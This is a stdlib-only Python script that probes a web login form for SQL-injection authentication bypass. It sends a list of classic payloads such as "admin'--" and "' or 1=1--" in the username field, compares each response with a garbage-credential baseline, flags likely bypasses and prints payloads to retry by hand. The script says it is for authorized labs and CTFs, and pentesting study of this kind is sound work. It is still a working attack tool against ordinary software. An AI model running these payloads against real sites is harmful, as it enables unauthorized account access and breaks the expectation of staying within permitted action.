"""
sqli_probe.py — checks if a login page is SQL injectable (auth bypass).

Stdlib only. Authorized targets only (labs, CTFs, your own apps).

USAGE:
    python sqli_probe.py http://127.0.0.1:5050
    python sqli_probe.py http://10.10.x.x:8080 --user-field uname --pass-field pwd

HOW THE CHECK WORKS:
    1. Fetch the page (or a form action it points to), learn its field names.
    2. Send GARBAGE credentials -> record the baseline response
       (status code, length, error hint).
    3. Try classic injection payloads in the username field.
    4. If a payload's response differs from the baseline in a strong
       way (status change, redirect, big length change, error text
       appearing/disappearing) or the payload text leaks into the page ->
       flag it as POSSIBLY VULNERABLE and say which payload did it.
    5. Final verdict + manual payloads to try yourself in the browser.
"""

import argparse
import html
import re
import urllib.error
import urllib.parse
import urllib.request

# payloads tried in the USERNAME field (password gets benign filler)
USER_PAYLOADS = [
    "admin'--",
    "admin'#",
    "admin' or '1'='1",
    "admin\"--",
    "' or 1=1--",
    "' or 1=1 #",
    "admin'-- -",
    "') or ('1'='1",
    "') or 1=1--",
    "admin' and '1'='1'--",
]

FILLER_PASSWORD = "definitely-wrong-password-123"
GARBAGE_USER = "no_such_user_xyz"

SPACE_PAYLOADS = {"admin'--", "admin'#", "admin'-- -"}


# ---------- tiny form parser (stdlib regex, no BeautifulSoup) ----------

def parse_form(page_html: str, base_url: str):
    """Return (action_url, first_two_visible_input_names)."""
    m = re.search(r"<form\b[^>]*>", page_html, re.I)
    tags = re.findall(r"<input\b[^>]*>", page_html, re.I)
    fields = []
    for t in tags:
        name = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
        itype = re.search(r'type=["\']([^"\']+)["\']', t, re.I)
        itype = (itype.group(1).lower() if itype else "")
        if name and itype not in ("submit", "hidden", "button", "image"):
            fields.append(name.group(1))
    action = ""
    if m:
        a = re.search(r'action=["\']([^"\']*)["\']', m.group(0), re.I)
        if a:
            action = a.group(1)
    action_url = urllib.parse.urljoin(base_url, action) if action else base_url
    return action_url, fields[:2]


# ---------- plain HTTP POST via urllib ----------

def post(url: str, data: dict):
    """Return (status, body_text). status 0 = connection crash (itself a signal)."""
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Content-Type":
                                          "application/x-www-form-urlencoded",
                                          "User-Agent": "sqli-probe (authorized lab use)"})
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=10) as r:
            return r.status, r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="ignore")
    except (urllib.error.URLError, ConnectionError, OSError):
        return 0, ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--user-field", default=None)
    ap.add_argument("--pass-field", default=None)
    args = ap.parse_args()

    # 1. get the login form
    try:
        with urllib.request.urlopen(args.url, timeout=10) as r:
            page = r.read().decode(errors="ignore")
    except Exception as e:
        print(f"[!] can't reach {args.url}: {e}")
        return

    target_url, fields = parse_form(page, args.url)
    user_field = args.user_field or (fields[0] if fields else "username")
    pass_field = args.pass_field or (fields[1] if fields else "password")
    print(f"[*] form target : {target_url}")
    print(f"[*] fields      : user='{user_field}', pass='{pass_field}'")

    # 2. baseline: garbage creds
    code, base_html = post(target_url, {user_field: GARBAGE_USER,
                                        pass_field: FILLER_PASSWORD})
    base_size = len(base_html)
    baseline = (code, base_size)
    print(f"[*] baseline    : garbage creds -> status {code}, length {base_size}\n")

    print(f"{'payload':32} {'status':>6} {'length':>8}  signal")
    print("-" * 64)

    hits = []
    for p in USER_PAYLOADS:
        payload = f"{p} " if p in SPACE_PAYLOADS else p
        code, body = post(target_url, {user_field: payload,
                                       pass_field: FILLER_PASSWORD})
        size = len(body)
        # the username prefix the page would echo back if login succeeded
        echoed = p.split("'")[0].split('"')[0]
        if code == 0:
            signal, changed = "SERVER CRASHED on input", True
        elif code != baseline[0]:
            signal, changed = f"status {baseline[0]}->{code}", True
        elif echoed and echoed in body and echoed not in base_html:
            signal, changed = "login echoed username", True
        elif abs(size - base_size) > 40:
            signal, changed = "big body change", True
        else:
            signal, changed = "same as baseline", False
        mark = "  << POSSIBLE BYPASS" if changed else ""
        print(f"{p:32} {code:>6} {size:>8}  {signal}{mark}")
        if changed:
            hits.append((p, signal))

    print("-" * 64)
    if hits:
        print(f"\n[!!] {len(hits)} payload(s) changed the response — input is "
              "probably reaching SQL unfiltered.")
        print("     Verify in a browser (login bypass) with:")
        for h, s in hits[:3]:
            print(f"       username: {h!r:<28} signal: {s}")
    else:
        print("\n[ok] no classic bypass worked. Not proof of safety —")
        print("     blind/error-based injection needs deeper tests.")


if __name__ == "__main__":
    print("authorized targets only\n")
    main()
